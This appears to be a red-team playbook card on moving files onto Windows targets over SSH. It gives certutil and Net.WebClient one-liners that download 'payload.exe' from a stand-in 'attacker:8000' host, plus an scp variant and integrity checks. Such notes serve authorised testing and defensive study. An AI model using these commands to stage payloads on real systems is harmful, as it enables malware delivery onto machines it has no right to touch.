# Windows File Transfer over SSH PTY — `certutil`, NOT `Invoke-WebRequest`

## When this applies

- Windows targets accessed via OpenSSH (PowerShell over a non-PTY transport).
- Goal: transfer files onto the target without falling into the `Invoke-WebRequest` PTY trap.

## Technique

`Invoke-WebRequest` / `iwr` / `wget` (PowerShell alias) ALL fail with `Win32 internal error "Access is denied" 0x5 occurred while reading the console output buffer`. The PowerShell host can't manipulate the PTY's console buffer. Replacements that actually work:

## Steps

```cmd
certutil -urlcache -split -f http://attacker:8000/payload.exe C:\Users\<u>\Documents\p.exe
```

```powershell
# Or System.Net.WebClient (no console interaction):
(New-Object Net.WebClient).DownloadFile('http://attacker:8000/payload.exe','C:\Users\<u>\Documents\p.exe')
# Or via SSH SCP (if OpenSSH server has sftp-server enabled):
scp -P 22 payload.exe user@target:C:/Users/user/Documents/
```

Verify size after transfer (`dir <path>`) — silent partial downloads are common when the listener restarts mid-transfer.

## Verifying success

- `dir <path>` shows the file with the expected size.
- Hash matches (`certutil -hashfile <path> SHA256`).

## Common pitfalls

- `Invoke-WebRequest` hangs / errors with `0x5 internal error` over SSH non-PTY transports — silently broken.
- Listener restarts mid-transfer cause silent partial downloads — always verify size after.

## Tools

- certutil
- `[System.Net.WebClient]::DownloadFile`
- scp (with sftp-server enabled)
